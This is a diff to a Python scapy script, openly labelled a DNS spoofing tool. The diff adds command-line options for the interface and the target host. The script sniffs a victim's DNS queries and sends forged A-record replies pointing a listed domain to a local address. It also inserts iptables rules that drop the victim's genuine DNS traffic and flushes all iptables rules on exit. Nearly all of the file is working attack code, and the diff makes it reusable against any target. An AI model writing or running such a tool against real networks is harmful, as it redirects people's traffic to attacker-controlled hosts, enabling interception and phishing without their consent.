@@ -3,6 +3,8 @@
 from cython import *
 import scapy.all as scapy
 import os
+import argparse
+
 
 dns_hosts={
     b"fflogs.com.":"192.168.1.83",
@@ -12,9 +14,10 @@ dns_hosts={
 }
 
 #sniffpackets function
-def sniffpackets(interface):
+def sniffpackets(interface, target):
     #sniff for DNS traffic
-    scapy.sniff(iface=interface,count=0,filter="host 192.168.1.76", store=False, prn=process_sniffed_packet)
+    f = "host "+target
+    scapy.sniff(iface=interface,count=0,filter=f, store=False, prn=lambda x: process_sniffed_packet(x, target))
 
 def create_packet(packet):
     #create a new packet using info from original packet
@@ -40,18 +43,18 @@ def create_packet(packet):
             rrname=packet[scapy.DNS].qd.qname,
             type='A',
             ttl=100,
-            rdata='192.168.1.83'
+            rdata=dns_hosts[packet[scapy.DNS].qd.qname]
             )
         )
     #return the packet
     return eth/ip/udp/dns
 
-def process_sniffed_packet(packet):
+def process_sniffed_packet(packet, target):
     if packet.haslayer(scapy.DNSQR):
         #reply with spoofed packet
         qname = packet[scapy.DNSQR].qname.decode()
         print(qname)
-        if packet.getlayer(scapy.DNSQR).qname in dns_hosts and packet.getlayer(scapy.IP).src == '192.168.1.76':
+        if packet.getlayer(scapy.DNSQR).qname in dns_hosts and packet.getlayer(scapy.IP).src == target:
             print('[+] Spoofing packet')
             # packet.show()
             try:
@@ -64,18 +67,24 @@ def process_sniffed_packet(packet):
                 print(e)
                 # scapy.send(packet)
 
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff on")
+    parser.add_argument("-t", "--target", dest="target", help="Target to spoof")
+    return parser.parse_args()
 
-def main():
+def main(args):
     print("[+] Starting DNS spoofing...")
-    sniffpackets("wlo1")
+    sniffpackets(args.interface, args.target)
 
 if __name__ == "__main__":
     try:
+        args = parse_args()
         os.system("iptables -A FORWARD -p udp --sport 53 -d 192.168.1.76 -j DROP")
         os.system("iptables -A FORWARD -p tcp --sport 53 -d 192.168.1.76 -j DROP")
         os.system("iptables -A FORWARD -p udp --dport 53 -s 192.168.1.76 -j DROP")
         os.system("iptables -A FORWARD -p tcp --dport 53 -s 192.168.1.76 -j DROP")
-        main()
+        main(args)
     except KeyboardInterrupt:
         os.system("iptables --flush")
         print("[+] Stopping DNS spoofing...")
